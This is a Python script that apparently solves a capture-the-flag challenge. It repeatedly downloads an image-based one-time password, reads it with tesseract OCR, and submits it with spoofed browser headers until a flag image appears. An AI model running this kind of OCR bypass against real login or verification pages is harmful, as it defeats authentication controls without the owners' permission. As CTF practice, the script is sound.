import os
import requests
from PIL import Image
import PIL.ImageOps

url = 'http://challenge.ctf.games:32618/'

cookies = {}
#cookies = {'csrftoken': 'kBGOzF91E49xtWBRAvYf8pP4VpH8YzmZsTMt9zB986tF9BADxkTA8327rl9L5rAF'}

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'Origin': f'{url}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-GPC': '1',
    'Referer': f'{url}',
    'Accept-Language': 'en-US,en;q=0.9',
}


while True:
	os.system(f'wget {url}static/otp.png -O otp.png')
	#os.system('tesseract otp.png otp')
	image = Image.open('otp.png')
	inverted_image = PIL.ImageOps.invert(image)
	inverted_image.save('otp-inverted.png')
	os.system('tesseract otp-inverted.png otp')
	print()
	otp = ''
	with open('otp.txt','r') as f:
	    otp = f.readlines()[0].strip()
	print('-'*20)    
	print(otp)
	print('-'*20)	

	data = {'otp_entry':otp}

	res = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False).text
	
	print('*'*20)
	print(res[res.find('"count"'):res.find('"count"')+10])
	print('*'*20)
	
	if requests.get(url+'static/flag.png', headers=headers, cookies=cookies, verify=False).status_code != 404:
		os.system(f'wget {url}static/flag.png -O flag.png')
		print('FLAG FOUND')
		break
